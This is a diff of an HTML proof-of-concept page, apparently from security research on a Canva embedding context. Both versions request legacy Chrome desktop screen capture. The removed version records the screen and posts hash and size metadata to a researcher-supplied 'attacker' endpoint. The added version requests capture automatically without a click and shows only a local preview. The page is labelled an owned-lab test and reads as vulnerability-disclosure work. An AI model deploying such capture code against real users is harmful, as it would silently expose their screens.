@@ -5,230 +5,172 @@
   <meta name="viewport" content="width=device-width,initial-scale=1">
   <meta name="referrer" content="no-referrer">
   <meta http-equiv="Content-Security-Policy"
-        content="default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; connect-src https:; img-src 'none'; media-src blob:; frame-src 'none'; worker-src 'none'; object-src 'none'; base-uri 'none'; form-action 'none'">
-  <title>Authorized Canva screen capture impact callback</title>
+        content="default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; connect-src 'none'; img-src 'none'; media-src blob:; frame-src 'none'; worker-src 'none'; object-src 'none'; manifest-src 'none'; base-uri 'none'; form-action 'none'">
+  <title>Owned Canva legacy screen-capture check</title>
   <style>
-    :root { color-scheme: dark; font-family: ui-monospace, SFMono-Regular, Consolas, monospace }
+    :root { color-scheme: dark; font-family: ui-monospace, monospace }
     * { box-sizing: border-box }
-    body { margin: 0; padding: 20px; background: #071019; color: #eaf5ff }
-    main { width: min(980px,100%); margin: auto }
-    h1 { margin: 0 0 8px }
-    .warning { padding: 12px; border: 2px solid #f59e0b; background: #3b2509 }
-    label { display: block; margin-top: 12px; color: #c7d8e8 }
-    input { width: 100%; margin-top: 6px; padding: 10px; background: #111827; color: white; border: 1px solid #64748b }
-    button { width: 100%; margin-top: 14px; padding: 12px; border: 0; background: #b91c1c; color: white; font: inherit; font-weight: 800 }
+    body { margin: 0; padding: 20px; background: #0b1117; color: #edf4fb }
+    main { width: min(960px, 100%); margin: auto }
+    h1 { margin: 0 0 8px; font-size: clamp(22px, 4vw, 36px) }
+    .notice { margin: 0 0 14px; color: #b9c8d7 }
+    .capture { position: relative; min-height: 260px; border: 2px solid #8b5cf6; background: #020617 }
+    video { display: block; width: 100%; max-height: 58vh; min-height: 260px; object-fit: contain; background: #020617 }
+    .badge { position: absolute; top: 12px; left: 12px; padding: 7px 10px; background: #991b1b; color: #fff; font-weight: 700 }
+    .countdown { position: absolute; top: 12px; right: 12px; padding: 7px 10px; background: #111827dd }
+    pre { min-height: 118px; margin: 14px 0 0; padding: 12px; border: 1px solid #475569; background: #111820; white-space: pre-wrap; overflow-wrap: anywhere }
+    button { width: 100%; margin-top: 12px; padding: 12px; border: 0; background: #7c3aed; color: #fff; font: inherit; font-weight: 700 }
     button:disabled { opacity: .55 }
-    video { width: 100%; min-height: 240px; max-height: 50vh; margin-top: 14px; background: #020617; border: 2px solid #ef4444; object-fit: contain }
-    pre { min-height: 180px; padding: 12px; background: #111827; border: 1px solid #475569; white-space: pre-wrap; overflow-wrap: anywhere }
   </style>
 </head>
 <body>
-<main>
-  <h1>Authorized metadata-only impact callback</h1>
-  <p class="warning">
-    VISIBLE OWNED-LAB TEST. This page captures and records five seconds from an
-    owned blank desktop, sends only SHA-256/byte-count/track metadata to the
-    researcher receiver, and sends no screen or audio bytes.
-  </p>
-  <label>HTTPS receiver endpoint
-    <input id="collector" type="url" placeholder="https://owned-tunnel.example/evidence" autocomplete="off">
-  </label>
-  <label>Throwaway pairing token
-    <input id="token" type="password" placeholder="owned-lab-token" autocomplete="off">
-  </label>
-  <button id="start" type="button">Start visible authorized capture + metadata callback</button>
-  <video id="preview" autoplay muted playsinline></video>
-  <pre id="status">Waiting for the researcher to enter the owned receiver endpoint.</pre>
-</main>
-<script>
-"use strict";
+  <main>
+    <h1>Owned screen-capture boundary check</h1>
+    <p class="notice">One automatic legacy desktop request. Live local preview only; no recording, persistence, or transmission. The stream stops after 25 seconds.</p>
+    <div class="capture">
+      <video id="preview" autoplay muted playsinline></video>
+      <div id="badge" class="badge">STARTING</div>
+      <div id="countdown" class="countdown">25 s maximum</div>
+    </div>
+    <button id="stop" type="button" disabled>Stop screen stream now</button>
+    <pre id="status">Waiting 1200 ms before the single owned-lab request...</pre>
+  </main>
+  <script>
+    "use strict";
 
-const sourceId = "screen:-1:0";
-const recordingMilliseconds = 5000;
-const maximumRecordedBytes = 16 * 1024 * 1024;
-const collectorInput = document.getElementById("collector");
-const tokenInput = document.getElementById("token");
-const startButton = document.getElementById("start");
-const preview = document.getElementById("preview");
-const status = document.getElementById("status");
-let stream = null;
-let recorder = null;
-let chunks = [];
+    const automaticStopMilliseconds = 25000;
+    const preview = document.getElementById("preview");
+    const badge = document.getElementById("badge");
+    const countdown = document.getElementById("countdown");
+    const status = document.getElementById("status");
+    const stopButton = document.getElementById("stop");
+    let stream = null;
+    let stopTimer = 0;
+    let countdownTimer = 0;
+    let deadline = 0;
+    let stopped = false;
+    let resolvedProof = null;
 
-function show(value) {
-  status.textContent = typeof value === "string" ? value : JSON.stringify(value, null, 2);
-}
+    const policy = document.permissionsPolicy || document.featurePolicy;
+    const displayCaptureDelegated = (() => {
+      try { return policy ? policy.allowsFeature("display-capture") : "unavailable"; }
+      catch { return "unavailable"; }
+    })();
 
-function stopTracks() {
-  if (stream) for (const track of stream.getTracks()) track.stop();
-  preview.srcObject = null;
-}
+    function show(value) {
+      status.textContent = typeof value === "string" ? value : JSON.stringify(value, null, 2);
+    }
 
-function discardChunks() {
-  for (let index = 0; index < chunks.length; index++) chunks[index] = null;
-  chunks.length = 0;
-}
+    function stopAll(reason) {
+      if (stopped) return;
+      stopped = true;
+      clearTimeout(stopTimer);
+      clearInterval(countdownTimer);
+      const tracks = stream ? stream.getTracks() : [];
+      for (const track of tracks) track.stop();
+      preview.srcObject = null;
+      stopButton.disabled = true;
+      badge.textContent = "STOPPED";
+      badge.style.background = "#334155";
+      countdown.textContent = "0 s";
+      show({
+        ...(resolvedProof || {}),
+        outcome: "stopped",
+        captureOutcome: resolvedProof ? "legacy-desktop-capture-resolved" : "not-resolved",
+        reason,
+        sourceId: "screen:-1:0",
+        trackCount: tracks.length,
+        allTracksStopped: tracks.every((track) => track.readyState === "ended"),
+        previewLocalOnly: true,
+        recorded: false,
+        stored: false,
+        transmitted: false
+      });
+    }
 
-async function sha256Hex(buffer) {
-  const digest = await crypto.subtle.digest("SHA-256", buffer);
-  return Array.from(new Uint8Array(digest), byte => byte.toString(16).padStart(2, "0")).join("");
-}
+    stopButton.addEventListener("click", () => stopAll("manual stop"), { once: true });
+    addEventListener("pagehide", () => stopAll("page hidden"), { once: true });
 
-function validateCollector(raw) {
-  const url = new URL(raw);
-  if (url.protocol !== "https:") throw new Error("Receiver must use HTTPS");
-  if (url.username || url.password) throw new Error("Receiver URL must not contain credentials");
-  if (url.pathname !== "/evidence") throw new Error("Receiver path must be exactly /evidence");
-  url.hash = "";
-  return url.href;
-}
+    async function runSingleRequest() {
+      const activationBeforeRequest = {
+        isActive: navigator.userActivation ? navigator.userActivation.isActive : "unavailable",
+        hasBeenActive: navigator.userActivation ? navigator.userActivation.hasBeenActive : "unavailable"
+      };
 
-async function run() {
-  startButton.disabled = true;
-  let collector;
-  let token = tokenInput.value;
-  try {
-    collector = validateCollector(collectorInput.value);
-    if (token.length < 8 || token.length > 256) throw new Error("Use an 8-256 character throwaway token");
-  } catch (error) {
-    show({ outcome: "configuration-rejected", error: error.message });
-    startButton.disabled = false;
-    return;
-  }
-
-  const activationBeforeRequest = {
-    isActive: navigator.userActivation ? navigator.userActivation.isActive : "unavailable",
-    hasBeenActive: navigator.userActivation ? navigator.userActivation.hasBeenActive : "unavailable"
-  };
-
-  try {
-    stream = await navigator.mediaDevices.getUserMedia({
-      audio: false,
-      video: {
-        mandatory: {
-          chromeMediaSource: "desktop",
-          chromeMediaSourceId: sourceId,
-          maxWidth: 1280,
-          maxHeight: 720,
-          maxFrameRate: 5
-        }
-      }
-    });
-
-    const videoTrack = stream.getVideoTracks()[0];
-    if (!videoTrack) throw new Error("No desktop video track returned");
-    preview.srcObject = stream;
-    try { await preview.play(); } catch (_) {}
-
-    const mimeCandidates = ["video/webm;codecs=vp8", "video/webm"];
-    const mimeType = mimeCandidates.find(candidate => MediaRecorder.isTypeSupported(candidate)) || "";
-    recorder = mimeType
-      ? new MediaRecorder(stream, { mimeType, videoBitsPerSecond: 1000000 })
-      : new MediaRecorder(stream, { videoBitsPerSecond: 1000000 });
-
-    let totalBytes = 0;
-    recorder.addEventListener("dataavailable", event => {
-      if (!event.data || event.data.size === 0) return;
-      totalBytes += event.data.size;
-      if (totalBytes > maximumRecordedBytes) {
-        recorder.stop();
+      try {
+        stream = await navigator.mediaDevices.getUserMedia({
+          audio: false,
+          video: {
+            mandatory: {
+              chromeMediaSource: "desktop",
+              chromeMediaSourceId: "screen:-1:0",
+              maxWidth: 1280,
+              maxHeight: 720,
+              maxFrameRate: 5
+            }
+          }
+        });
+      } catch (error) {
+        badge.textContent = "REQUEST FAILED";
+        badge.style.background = "#92400e";
+        countdown.textContent = "not active";
+        show({
+          outcome: "request-failed",
+          sourceId: "screen:-1:0",
+          displayCaptureDelegated,
+          activationBeforeRequest,
+          errorName: error && error.name ? error.name : "Error",
+          errorMessage: error && error.message ? error.message : String(error),
+          recorded: false,
+          stored: false,
+          transmitted: false
+        });
         return;
       }
-      chunks.push(event.data);
-    });
 
-    const stopped = new Promise((resolve, reject) => {
-      recorder.addEventListener("stop", resolve, { once: true });
-      recorder.addEventListener("error", event => reject(event.error || new Error("MediaRecorder error")), { once: true });
-    });
+      const videoTracks = stream.getVideoTracks();
+      const audioTracks = stream.getAudioTracks();
+      const track = videoTracks[0] || null;
+      if (!track) {
+        stopAll("resolved stream had no video track");
+        return;
+      }
+      preview.srcObject = stream;
+      let previewPlayResult = "resolved";
+      try { await preview.play(); }
+      catch (error) { previewPlayResult = `${error.name}: ${error.message}`; }
 
-    show({
-      outcome: "visible-authorized-recording-in-progress",
-      sourceId,
-      activationBeforeRequest,
-      recordingMilliseconds,
-      mediaTransferred: false
-    });
-    recorder.start(500);
-    setTimeout(() => {
-      if (recorder.state !== "inactive") recorder.stop();
-    }, recordingMilliseconds);
-    await stopped;
-    stopTracks();
+      badge.textContent = "LIVE LOCAL PREVIEW";
+      deadline = Date.now() + automaticStopMilliseconds;
+      countdownTimer = setInterval(() => {
+        const remaining = Math.max(0, Math.ceil((deadline - Date.now()) / 1000));
+        countdown.textContent = `${remaining} s remaining`;
+      }, 250);
+      stopTimer = setTimeout(() => stopAll("25-second limit"), automaticStopMilliseconds);
+      stopButton.disabled = false;
 
-    const blob = new Blob(chunks.filter(Boolean), { type: recorder.mimeType || "video/webm" });
-    const bytes = await blob.arrayBuffer();
-    const recordedSha256 = await sha256Hex(bytes);
-    new Uint8Array(bytes).fill(0);
+      resolvedProof = {
+        outcome: "legacy-desktop-capture-resolved",
+        sourceId: "screen:-1:0",
+        origin: location.origin,
+        displayCaptureDelegated,
+        activationBeforeRequest,
+        videoTracks: videoTracks.length,
+        audioTracks: audioTracks.length,
+        trackKind: track ? track.kind : null,
+        trackLabel: track ? track.label : null,
+        trackSettings: track ? track.getSettings() : null,
+        previewPlayResult,
+        automaticStopSeconds: automaticStopMilliseconds / 1000,
+        previewLocalOnly: true,
+        recorded: false,
+        stored: false,
+        transmitted: false
+      };
+      show(resolvedProof);
+    }
 
-    const payload = {
-      token,
-      event: "owned-screen-recording-metadata-proof",
-      origin: location.origin,
-      sourceId,
-      recordingMilliseconds,
-      recordedByteLength: blob.size,
-      recordedSha256,
-      mimeType: recorder.mimeType || "video/webm",
-      videoTracks: stream.getVideoTracks().length,
-      audioTracks: stream.getAudioTracks().length,
-      trackLabel: videoTrack.label,
-      trackSettings: videoTrack.getSettings(),
-      activationBeforeRequest,
-      mediaTransferred: false,
-      stored: false
-    };
-    discardChunks();
-    tokenInput.value = "";
-    token = "";
-
-    const response = await fetch(collector, {
-      method: "POST",
-      mode: "cors",
-      credentials: "omit",
-      redirect: "error",
-      referrerPolicy: "no-referrer",
-      headers: { "Content-Type": "text/plain;charset=UTF-8" },
-      body: JSON.stringify(payload)
-    });
-    const reply = await response.json();
-    show({
-      outcome: "metadata-received-by-owned-attacker-server",
-      collectorOrigin: new URL(collector).origin,
-      recordedByteLength: payload.recordedByteLength,
-      recordedSha256: payload.recordedSha256,
-      mimeType: payload.mimeType,
-      activationBeforeRequest,
-      serverReply: reply,
-      mediaTransferred: false,
-      recordingRetained: false,
-      stored: false
-    });
-  } catch (error) {
-    try {
-      if (recorder && recorder.state !== "inactive") recorder.stop();
-    } catch (_) {}
-    stopTracks();
-    discardChunks();
-    tokenInput.value = "";
-    token = "";
-    show({
-      outcome: "impact-demonstration-failed",
-      errorName: error && error.name ? error.name : "Error",
-      errorMessage: error && error.message ? error.message : String(error),
-      mediaTransferred: false,
-      stored: false
-    });
-    startButton.disabled = false;
-  }
-}
-
-startButton.addEventListener("click", run, { once: true });
-addEventListener("pagehide", () => {
-  try { if (recorder && recorder.state !== "inactive") recorder.stop(); } catch (_) {}
-  stopTracks();
-  discardChunks();
-}, { once: true });
-</script>
+    setTimeout(runSingleRequest, 1200);
+  </script>
 </body>
 </html>
